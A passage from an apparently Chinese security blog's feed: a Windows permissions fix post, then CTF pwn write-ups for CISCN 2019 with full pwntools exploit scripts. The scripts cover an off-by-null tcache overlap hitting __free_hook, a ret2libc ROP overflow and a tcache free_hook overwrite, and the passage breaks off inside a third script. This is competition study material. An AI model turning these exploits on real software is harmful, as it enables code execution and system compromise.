    <content type="html"><![CDATA[<p>今天我一觉醒来，发现我电脑不可写入文件了，弄得我是一脸懵逼。我仔细想了想昨天发生了什么，原来是win10自动更新了。然后我尝试了修改文件夹的所有者，但是发现又慢还无济于事。<br>不过有幸这我是在一次机缘巧合之下才知道修改本地安全策略的时候会出现这种情况，所以我开始怀疑是不是本地账户出现了问题。<br>具体操作如下<br>首先进入“控制面板”==》“管理工具”===》“本地安全策略”=====》“本地策略”====》“安全选项”=====》“用户账户控制：以管理员批准模式运行所有管理员”改为已禁用和“用户账户控制：用于内置管理员账户的管理员批准模式”已禁用。这两个是再win10更新到1903之后，默认未定义，这个时候我们改为已禁用之后，系统提示重启生效，然后重启就可以了。亲测有效。<br>关于怎么遇到这种情况的，那就要从我要删除一个流氓文件夹开始。<br>我重装系统的时候，用的不是纯净版镜像，然后装上之后，就出现各种流氓软件，在我耐心的删除下，终于删除差不多了。<br>然鹅有一个文件夹一直删不掉，提示我权限不够<br>我就修改文件所有者之类的方式我都尝试了一遍，还是没有用。<br>但是我看见一个CSDN上的老哥，教我用以上的方式修改本地安全策略，将我列举出来的那两项默认是已禁用修改为已启用。然后我修改完事之后，就出现了只能新建文件夹。我各种软件写入权限就开始报错。然后我就改回去了。<br>虽然说CSDN上面这个老哥有点坑，但是还是让我学到了东西，知道这个两个权限修改之后会出现降权的问题，不然这次的问题就无法解决了，只能重装。这是算是CSDN老哥救了我的电脑。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天我一觉醒来，发现我电脑不可写入文件了，弄得我是一脸懵逼。我仔细想了想昨天发生了什么，原来是win10自动更新了。然后我尝试了修改文件夹的所有者，但是发现又慢还无济于事。&lt;br&gt;不过有幸这我是在一次机缘巧合之下才知道修改本地安全策略的时候会出现这种情况，所以我开始怀疑是不
      
    
    </summary>
    
    
      <category term="其他" scheme="http://Whali3n51.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN_final_CN16</title>
    <link href="http://whali3n51.github.io/2019/08/06/CN16/"/>
    <id>http://whali3n51.github.io/2019/08/06/CN16/</id>
    <published>2019-08-05T23:04:35.000Z</published>
    <updated>2020-01-08T06:45:10.721Z</updated>
    
    <content type="html"><![CDATA[<p>好久都没有更新了，因为准备考试和比赛，博客更新就有些迟缓了。现在我来说一说总决赛的pwn题。个人实力很菜，比赛当天我一题也做不出来，也不会fix，fix之后服务器就异常了.怎么说呢，就很惨，被打到自闭，新赛制，黑盒修补漏洞，谜之异常，谜之exp通过。所以这里就来复现一下总决赛的题目，因为没有出题人的check脚本，这里主要讲讲break的思路，fix的思路简单说一说，但是不保证正确。希望自己就不要再这么菜下去了。接下来的几篇博客更新，就从我的角度来讲，由易到难的更新，可能更新到后面就没有后文了，那是可能就是因为大佬们的脚本我已经看不懂了。</p><p>先看一下第二天的CN16，这一题我当天没有做出来，我很自闭，因为一个简单的offbyone的漏洞，按照我的脚本一直做不出，赛后lancet战队大佬分享这一道题目的时候，说是CTF-wiki的原题，听到这一句话的时候我彻底自闭了，我哭了，这一题就是tcache第一道的原题，不过这里也不得不吐槽一下主办方了，作为总决赛还能出现原题，这也是专家评审的不严格，原题build分还能给这么高，还能入选，不得不说这次总决赛槽点很多。<br>首先拿到题目看到文件给了两个文件<br><a href="https://i.loli.net/2019/08/06/fQdBRTbUomFJvOj.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/08/06/fQdBRTbUomFJvOj.png" alt=""></a><br>看到给了libc文件，其实这样libc文件是libc-2.27的文件。我很菜，对于tcache没什么敏感度，主要是之前对这一块的题目没有做的太多吧，我比赛当天把他默认为libc-2.23版本在做。<br>再看题吧<br>将源文件拖入IDA<br>malloc函数<br><a href="https://i.loli.net/2019/08/06/7sgGpya1ZlU2HFJ.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/08/06/7sgGpya1ZlU2HFJ.png" alt=""></a><br>程序创建堆块默认创建0xf8大小，这里就立马想到可能存在off-by-one漏洞<br><a href="https://i.loli.net/2019/08/06/EbTgF5px2vYBNUI.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/08/06/EbTgF5px2vYBNUI.png" alt=""></a><br>发现这里存在off-by-onenull的漏洞，可以修改下一个堆块的pre_chunk位，可以造成overlap或者是unlink<br>运行文件<br><a href="https://i.loli.net/2019/08/06/Vu3XaWpjSrUCdmb.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/08/06/Vu3XaWpjSrUCdmb.png" alt=""></a><br>发现程序只有三个功能<br>malloc<br>free<br>puts<br>好了程序的逻辑就在这里了<br>查看保护机制<br><a href="https://i.loli.net/2019/08/06/XmxReN1i7fErIWP.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/08/06/XmxReN1i7fErIWP.png" alt=""></a><br>不出意外全绿。<br>拿到off-by-onenull漏洞，因为这里开启pie,而且存放堆块的数组是再堆里面，我们不能进行unlink漏洞的利用。我们第一思考的就是overlap,但是这里的输入当我们输入0的时候，输入就会阶段，这里就要说一种新的构造方式<br>通过系统的写入自动把pre_size自己写上<br>我们先再分配三个chunk<br>A<br>B<br>C<br>当我们free掉A的时候，B块的pre_size为0x100<br>然后我们再free掉B块，C块的pre_size就为0x200了<br>而且再次malloc的时候是不会修改pre_size位的，也就是说，这么处理之后，只要我们不覆盖这两个地方的数字，这两个数字就是一直存放在pre_size位的。<br>然后通过off-by-onenull就很容易实现overlap。<br>在这一题里就很容易实现。</p><p>首先通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">0x2</span>, <span class="string">"a"</span>)</span><br><span class="line">fill_tcache(<span class="number">3</span>, <span class="number">10</span>)<span class="comment">#填充tcache</span></span><br><span class="line"><span class="comment">#保证我们的堆块在unsorted bin里面只有在这里面才能造成overlap</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>来构造出上述的那种情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">remove_tcache(<span class="number">7</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>, <span class="string">"7"</span>) <span class="comment"># chunk0</span></span><br><span class="line">malloc(<span class="number">0x2</span>, <span class="string">"8"</span>) <span class="comment"># chunk1 </span></span><br><span class="line">malloc(<span class="number">0x2</span>, <span class="string">"9"</span>) <span class="comment"># chunk3</span></span><br></pre></td></tr></table></figure><p>再次获得处理好之后的chunk</p><p>当我们要触发off-by-one-null这个漏洞的时候，必须是后面的一个堆块创建好了，前一个堆块再创建。才能修改后一个chunk的pre_chunk位。而且不能让这些堆块发生合并。</p><p>所以我们这里需要将‘8’这个chunk,也就是chunk1放入tcache中，然后再将chunk0放入unsorted bin中，再次分配chunk1，修改chunk3的pre_chunk位，然后才能造成overlap</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">8</span>)<span class="comment">#保存chunk1进入tcache</span></span><br><span class="line">fill_tcache(<span class="number">0</span>, <span class="number">6</span>)<span class="comment">#填充tcache</span></span><br><span class="line">free(<span class="number">7</span>)<span class="comment">#chunk0进入unsorted bin</span></span><br><span class="line">remove_tcache(<span class="number">6</span>)<span class="comment">#取出填充堆块</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">"7"</span>)<span class="comment">#重新获得chunk1，并且修改了chunk3的pre_chunk位</span></span><br><span class="line">fill_tcache(<span class="number">0</span>, <span class="number">7</span>)<span class="comment">#填充满tcache，防止chunk3进入tcache从而不发生unlink，制造不出overlap</span></span><br><span class="line">free(<span class="number">9</span>)<span class="comment">#触发漏洞，造成了漏洞</span></span><br></pre></td></tr></table></figure><p>可以从内存看出来</p><p><img src="D:%5CBackup%5C%E6%A1%8C%E9%9D%A2%5C%E6%A1%8C%E9%9D%A2%E6%96%87%E4%BB%B6%E5%A4%B9%5C%E4%B8%AA%E4%BA%BA%E6%96%87%E6%A1%A3%5Cwhalien51%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87%5CCN16%5C6.png" alt=""></p><p>现在unsorted bin中只有一个chunk,这个chunk的size位0x300,也就是说我们overlap成功了。也就是从0x559db3820300 -0x559db3820600 都是属于unsorted bin中，但是我们chunk1还在使用,还存放再使用的数组中。</p><p><img src="D:%5CBackup%5C%E6%A1%8C%E9%9D%A2%5C%E6%A1%8C%E9%9D%A2%E6%96%87%E4%BB%B6%E5%A4%B9%5C%E4%B8%AA%E4%BA%BA%E6%96%87%E6%A1%A3%5Cwhalien51%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87%5CCN16%5C7.png" alt=""></p><p>所以我们现在再到unsorted bin中分配0x100的chunk的话，我们就能将其实地址为0x559db3820400的chunk也就是chunk1再次分配到。然后我们放入tcache,使得chunk1造成double free.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">remove_tcache(<span class="number">7</span>)<span class="comment">#释放tcache,让下面的chunk从unsorted bin中获得</span></span><br><span class="line">malloc(<span class="number">0x1</span>, <span class="string">"8"</span>)<span class="comment">#从unsorted bin中得到chunk0</span></span><br><span class="line"><span class="comment">#这个时候unsorted bin中存放指向main_arena中的地址存放在了chunk1中</span></span><br><span class="line"><span class="comment">#注意我们存放指针的数组中chunk1的指针是在重新获取之后是没有释放过的。所以这个我们直接打印索引值为7也就是chunk1的指针，是能泄露出来main_arena的。</span></span><br><span class="line">puts(<span class="number">7</span>)</span><br><span class="line">main_arena = p.recv(<span class="number">6</span>)</span><br><span class="line">base = u64(main_arena.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"base_addr: "</span> + hex(base)</span><br><span class="line">one_gadget = base + <span class="number">0x4f322</span></span><br><span class="line">free_hook = base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x1</span>, <span class="string">"9"</span>)<span class="comment">#从unsorted bin中得到chunk1</span></span><br><span class="line"><span class="comment">#这个时候数组索引里面索引7和索引9的里面都存放着chunk1的指针。</span></span><br><span class="line"><span class="comment">#然后我们只需要将这两个chunk释放掉放入tcache中，就能造成chunk1的double free</span></span><br></pre></td></tr></table></figure><p>最后就是怎么getshell了。我们采用one_gadget，将__free_hook的指针改为one_gadget，然后就getshell.</p><p>如何去做呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x10</span>, p64(free_hook))<span class="comment">#因为这里chunk1在tcache里面存放着两次，先取出chunk1,修改tcache指针指向__free_hook</span></span><br><span class="line"><span class="comment">#这里其实可以再来两次malloc就可以分配到，但是这个题目到这里只能在分配一个chunk了，因为题目规定只能存放十个chunk，现在只剩下一个了。</span></span><br><span class="line"><span class="comment">#所以接下来这么做</span></span><br><span class="line">fill_tcache(<span class="number">0</span>, <span class="number">7</span>)<span class="comment">#填满tcache,但是这里的从0-7的索引值并不是全部进入了tcache,有两个进入unsorted bin。</span></span><br><span class="line">remove_tcache(<span class="number">7</span>)<span class="comment">#然后先进后出的顺序，再次分配，清空了tcache,但是最后的tcache指向的是__free_hook,所以再次分配堆块就去tcache所指向的地方</span></span><br><span class="line">malloc(<span class="number">0x10</span>, p64(one_gadget))<span class="comment">#分配到了__free_hook的堆块，修改__free_hook指针，指向one_gadget</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#随便free一个chunk,触发one_gadget,最终getshell</span></span><br></pre></td></tr></table></figure><p>这一题的break思路就是这样。但是我就有一点不明白，按照这个正常的思路，我fix的时候，将safe_read那个函数的off_by_one漏洞补上了，可是还是利用成功了，这个我就不太明白了，可能是出题人用了其他思路吧，我太菜看不出来吧。比赛的时候很迷，现在也没搞懂出题人是怎么将exp利用成功的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好久都没有更新了，因为准备考试和比赛，博客更新就有些迟缓了。现在我来说一说总决赛的pwn题。个人实力很菜，比赛当天我一题也做不出来，也不会fix，fix之后服务器就异常了.怎么说呢，就很惨，被打到自闭，新赛制，黑盒修补漏洞，谜之异常，谜之exp通过。所以这里就来复现一下总决
      
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tcache" scheme="http://Whali3n51.github.io/tags/tcache/"/>
    
      <category term="off-by-null" scheme="http://Whali3n51.github.io/tags/off-by-null/"/>
    
  </entry>
  
  <entry>
    <title>CISCN华北赛区pwn脚本及总结</title>
    <link href="http://whali3n51.github.io/2019/06/13/CISCN%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BApwn%E8%84%9A%E6%9C%AC%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <id>http://whali3n51.github.io/2019/06/13/CISCN%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BApwn%E8%84%9A%E6%9C%AC%E5%8F%8A%E6%80%BB%E7%BB%93/</id>
    <published>2019-06-13T12:01:00.000Z</published>
    <updated>2020-01-08T06:43:47.486Z</updated>
    
    <content type="html"><![CDATA[<p>先总结一波吧。这次比赛我真的是菜的扣脚，就做出两道题，和北邮的师傅根本比不了，北邮的pwn师傅真的太强了。真的膜拜，orz。<br>感觉这次比赛暴露了自己很多缺点，关于最近新学的堆应用根本不灵活，存在的遗憾就是第二天的pwn没做好吧，感觉自己能做，但是却偏偏卡在最后了，只能怪自己学的太菜了。第一天的pwn3也是感觉自己很垃圾，学的不够牢固，感觉自己学习没有总结好，关于什么漏洞最先思考的方向出现了问题，UAF漏洞，自己没总结好，最先思考的是fast bin double free，却不是最简单的fast bin重新单向链表的结构来控制指针块。感觉自己学的还是不够扎实，菜的不谈。<br>以后还是要好好学习，多做总结，多总结总结一些漏洞的相同点和一些漏洞的不同点，关于一些漏洞去怎么利用之类的。</p><h3 id="Day1"><a href="#Day1" class="headerlink" title="Day1:"></a>Day1:</h3><h6 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1:"></a>Pwn1:</h6><p>我队长做的<br>这是一道简单的栈溢出，基本的ROP构造。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">p = remote(<span class="string">'172.1.8.6'</span>,<span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./guess'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0400793</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">56</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.symbols[<span class="string">"main"</span>])</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'\x35\x0a'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libcbase)</span><br><span class="line">p.recv()</span><br><span class="line">system_addr=elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr=<span class="number">0x0018cd57</span>+libcbase</span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">56</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h6 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2:"></a>Pwn2:</h6><p>这一道题我队长做的<br>这一道是简单的tcache</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(p)</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">    binary = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">    create(p, <span class="string">'aaa\n'</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    libc.address = u64(leak(p, binary.got[<span class="string">'puts'</span>], <span class="number">8</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'libc_base: &#123;&#125;'</span>.format(hex(libc.address)))</span><br><span class="line">    add(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    create(p, p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    create(p, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    create(p, p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(p, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name:'</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">'age:'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(p, idx, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'name:'</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">'age:'</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disp</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'6'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(p, addr, size)</span>:</span></span><br><span class="line">    buy(p, <span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input the address you want to leak:'</span>)</span><br><span class="line">    p.sendline(hex(addr))</span><br><span class="line">    p.recvuntil(<span class="string">'input the size you want to leak:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'data:[[['</span>)</span><br><span class="line">    ret = p.recvuntil(<span class="string">']]]'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time</span><span class="params">(a)</span>:</span></span><br><span class="line">    self = a</span><br><span class="line">    default = Timeout.default</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">newrecvuntil</span><span class="params">(delims, drop=False, timeout = default)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(delims, (str, unicode)):</span><br><span class="line">            delims = (delims,)</span><br><span class="line">        longest = max(map(len, delims))</span><br><span class="line">        data = []</span><br><span class="line">        top = <span class="string">''</span></span><br><span class="line">        <span class="keyword">with</span> self.countdown(timeout):</span><br><span class="line">            <span class="keyword">while</span> self.countdown_active():</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res = self.recv(timeout=self.timeout)</span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    self.unrecv(<span class="string">''</span>.join(data) + top)</span><br><span class="line">                    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                    self.unrecv(<span class="string">''</span>.join(data) + top)</span><br><span class="line">                    <span class="keyword">raise</span> PwnlibException(<span class="string">'recvuntil &#123;&#125; timeout'</span>.format(repr(delims[<span class="number">0</span>])))</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line">                top += res</span><br><span class="line">                start = len(top)</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> delims:</span><br><span class="line">                    j = top.find(d)</span><br><span class="line">                    <span class="keyword">if</span> start &gt; j &gt; <span class="number">-1</span>:</span><br><span class="line">                        start = j</span><br><span class="line">                        end = j + len(d)</span><br><span class="line">                <span class="keyword">if</span> start &lt; len(top):</span><br><span class="line">                    self.unrecv(top[end:])</span><br><span class="line">                    <span class="keyword">if</span> drop:</span><br><span class="line">                        top = top[:start]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        top = top[:end]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">''</span>.join(data) + top</span><br><span class="line">                <span class="keyword">if</span> len(top) &gt; longest:</span><br><span class="line">                    i = -longest - <span class="number">1</span></span><br><span class="line">                    data.append(top[:i])</span><br><span class="line">                    top = top[i:]</span><br><span class="line">        <span class="keyword">raise</span> PwnlibException(<span class="string">'recvuntil &#123;&#125; timeout'</span>.format(repr(delims[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    tmp = a.recvuntil</span><br><span class="line">    a.recvuntil = newrecvuntil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> a==<span class="number">1</span>:</span><br><span class="line">p = remote(<span class="string">'172.1.8.7'</span>,<span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line">time(p)</span><br><span class="line">get_shell(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h6 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3:"></a>Pwn3:</h6><p>UAF结合fast bin attack重新控制堆块上的指针，然后程序内部调用这个指针，我们只需要将myfree指针替换为system指针就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"><span class="comment">#p=remote('172.1.8.9',8888)</span></span><br><span class="line">p=process(<span class="string">'./torchwood'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./torchwood'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,length,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'CNote &gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index &gt; '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'Type 